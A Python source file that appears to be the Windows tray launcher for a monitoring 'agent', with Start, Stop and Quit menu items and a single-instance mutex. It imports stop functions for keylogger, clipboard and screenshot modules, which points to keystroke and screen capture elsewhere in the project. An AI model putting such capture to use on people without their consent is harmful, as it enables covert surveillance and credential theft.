"""
Windows tray runner
"""

import multiprocessing
import sys
import threading
from pathlib import Path

from PIL import Image
import pystray
import win32api
import win32event

from config.settings import APP_NAME, ICON_PATH
from core.single_instance import windows_single_instance
from app.bootstrap import init_agent
from app.agent import Agent
from actions.keylogger import stop_keylogger
from actions.clipboard import stop_clipboard
from actions.screenshot import stop_screenshot
from logger import logger


class WindowsAgent:
    def __init__(self):
        self._agent_id = None
        self._agent_thread = None
        self._stop_event = threading.Event()
        self._running = False

        icon_image = self._load_icon_image()

        self.icon = pystray.Icon(
            APP_NAME,
            icon_image,
            APP_NAME,
            menu=pystray.Menu(
                pystray.MenuItem("Start Agent", self._start_agent),
                pystray.MenuItem("Stop Agent", self._stop_agent),
                pystray.Menu.SEPARATOR,
                pystray.MenuItem("Quit Agent", self._quit_agent),
            ),
        )

    def _load_icon_image(self):
        if getattr(sys, "frozen", False):
            base = Path(sys._MEIPASS)
        else:
            # pkgs/windows/main_windows.py -> project root
            base = Path(__file__).parent.parent.parent

        icon_path = base / ICON_PATH
        if icon_path.exists():
            try:
                return Image.open(icon_path)
            except Exception as exc:
                logger.error(f"Failed to load tray icon '{icon_path}': {exc}")

        # Fallback so tray still appears even if icon file fails.
        return Image.new("RGB", (64, 64), color=(50, 120, 220))

    def _run_agent(self):
        try:
            if not self._agent_id:
                self._agent_id = init_agent()

            agent = Agent(self._agent_id)
            agent.run(stop_event=self._stop_event)
        except Exception as exc:
            logger.error(f"Agent thread error: {exc}")
        finally:
            self._running = False

    def _start_agent(self, icon, item):
        if self._running:
            logger.info("Agent already running.")
            return

        self._stop_event.clear()
        self._running = True
        self._agent_thread = threading.Thread(target=self._run_agent, daemon=True)
        self._agent_thread.start()
        logger.info("Agent started from tray icon.")

    def _stop_agent(self, icon, item):
        if not self._running:
            logger.info("Agent is not running.")
            return

        self._stop_event.set()
        stop_keylogger()
        stop_clipboard()
        stop_screenshot()
        self._running = False
        logger.info("Agent stop requested from tray icon.")

    def _quit_agent(self, icon, item):
        self._stop_event.set()
        stop_keylogger()
        stop_clipboard()
        stop_screenshot()
        logger.info("Quit requested from tray icon.")
        self.icon.stop()

    def run(self):
        logger.info("Starting Windows tray icon...")
        self.icon.run()


if __name__ == "__main__":
    multiprocessing.freeze_support()

    instance_mutex = windows_single_instance()
    if instance_mutex is None:
        logger.info(f"{APP_NAME} is already running.")
        sys.exit(0)

    try:
        WindowsAgent().run()
    finally:
        try:
            win32event.ReleaseMutex(instance_mutex)
        except Exception:
            pass
        try:
            win32api.CloseHandle(instance_mutex)
        except Exception:
            pass
